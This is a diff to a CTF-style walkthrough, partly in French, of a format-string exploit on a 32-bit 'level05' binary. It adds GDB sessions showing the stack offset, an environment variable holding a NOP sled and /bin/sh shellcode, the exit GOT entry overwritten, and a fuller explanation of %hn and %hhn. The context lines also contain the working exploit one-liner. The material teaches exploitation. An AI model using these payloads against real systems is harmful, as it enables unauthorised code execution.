@@ -112,6 +112,29 @@ aaaa61616161
 
 This means whatever we place at the beginning of our input, we can reference it with `%10$x`. This will be critical for the write step.
 
+### Confirmation dans GDB : stack au moment du printf
+
+On peut vérifier en posant un breakpoint au `call printf` (`0x08048507`) :
+
+```
+(gdb) b *0x08048507
+(gdb) run <<< $(python -c 'print "AAAA" + "%x."*15')
+
+Breakpoint 1, 0x08048507 in main ()
+
+(gdb) x/wx $esp                              ← 1er arg de printf = adresse du buffer
+0xffffd4d0: 0xffffd4f8                        ← buffer à esp+0x28
+
+(gdb) x/15wx $esp
+0xffffd4d0: 0xffffd4f8 0x00000064 0xf7fcfac0 0xf7ec3af9
+0xffffd4e0: 0xffffd5ff 0xffffd5fe 0x00000000 0xffffffff
+0xffffd4f0: 0xffffd684 0xf7fdb000 0x61616161 0x2e782500
+                                   ^^^^^^^^^^
+                                   offset 10 = début du buffer (aaaa)
+```
+
+Le buffer commence bien à l'offset **10** par rapport au premier argument de `printf`.
+
 ---
 
 ## Step 6: Find the GOT address of `exit`
@@ -166,6 +189,23 @@ The `-m32` flag is important because our target binary is 32-bit. A 64-bit progr
 
 The shellcode lives at `0xffffd884`. The 100-byte NOP sled gives a margin of error; we target `0xffffd884` directly (the sled absorbs small shifts).
 
+### Vérification dans GDB
+
+On peut confirmer que la variable d'environnement est bien en mémoire et contient les NOPs + shellcode :
+
+```
+(gdb) b *0x08048507                          ← break au call printf
+(gdb) run <<< "test"
+
+Breakpoint 1, 0x08048507 in main ()
+
+(gdb) x/s 0xffffd884
+0xffffd884: '\220' <repeats 100 times>, "\061\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
+
+(gdb) x/4bx 0xffffd884
+0xffffd884: 0x90 0x90 0x90 0x90              ← NOP sled confirmé
+```
+
 ---
 
 ## Step 9: Craft the format string exploit
@@ -189,8 +229,11 @@ Instead, we split the 4-byte address into two 2-byte (short) writes using `%hn`:
 
 The `%n` format specifier is unique: instead of **printing** something, it **writes** to memory. It writes the number of characters printed so far to the address pointed to by the corresponding argument on the stack.
 
-- `%n` writes a 4-byte int
-- `%hn` writes a 2-byte short
+- **`%n`** — writes the counter as a **4-byte** `int` (full 32-bit word).
+- **`%hn`** — the **`h`** is a **length modifier** (like in `printf("%hd", ...)`): it tells `printf` to write the counter as a **`short`**, i.e. only **2 bytes** at the target address. This is why we can build the final pointer in **two half-writes** (low 16 bits, then high 16 bits) instead of one huge `%n` that would need billions of padding characters.
+- **`%hhn`** — writes only **1 byte** (`unsigned char`); useful for four single-byte writes, not used in this walkthrough.
+
+The **`h` does not add spaces** — spacing / padding comes from other specifiers such as **`%55420x`** (minimum field width), which pads the hex output so the **character count** reaches the value we need before `%hn` runs.
 
 Since we control what's on the stack (our input buffer is at offset 10), we can place addresses there and use `%hn` to write to them.
 
@@ -223,6 +266,22 @@ Note: the addresses `\xe0\x97\x04\x08` are written in **little-endian** byte ord
 (python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55420x%10$hn%10107x%11$hn"'; cat) | ./level05
 ```
 
+### Vérification de l'écriture GOT avant/après
+
+On peut confirmer dans GDB que le GOT de `exit` est bien écrasé :
+
+```
+(gdb) b *0x0804850c                          ← break après le call printf (0x08048507)
+(gdb) run <<< $(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%55420x%10$hn%10107x%11$hn"')
+
+Breakpoint 1, 0x0804850c in main ()
+
+(gdb) x/wx 0x080497e0                        ← GOT de exit
+0x080497e0: 0xffffd884                        ← redirigé vers notre shellcode
+```
+
+Avant l'exploit, cette entrée contenait l'adresse de `exit@libc`. Après le `printf` avec `%hn`, elle pointe vers `0xffffd884` (notre NOP sled + shellcode).
+
 The output will contain a huge amount of whitespace (from the `%55420x` and `%10107x` padding), then a shell is spawned. The `cat` keeps stdin open so we can type commands. Then:
 
 ```
@@ -249,7 +308,8 @@ export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x
 | **Format string vulnerability** | `printf(buffer)` lets us read/write stack memory |
 | **`%x` / `%N$x`** | Read values from the stack to find our buffer offset |
 | **GOT (Global Offset Table)** | Holds function addresses; overwriting `exit@GOT` redirects execution |
-| **`%hn`** | Writes a 2-byte value (number of chars printed so far) to a target address |
+| **`%hn`** | Writes a **2-byte** `short` (length modifier **`h`**) — half of a 32-bit pointer per write |
+| **`%hhn`** | Optional: writes **1 byte**; padding still comes from **`%Nx`**, not from `h` |
 | **NOP sled** | Provides a wide landing zone so we don't need a perfectly exact address |
 | **Shellcode** | Machine code that calls `/bin/sh` to give us a shell |
 | **Little-endian** | x86 stores bytes in reverse order; addresses must be written accordingly |
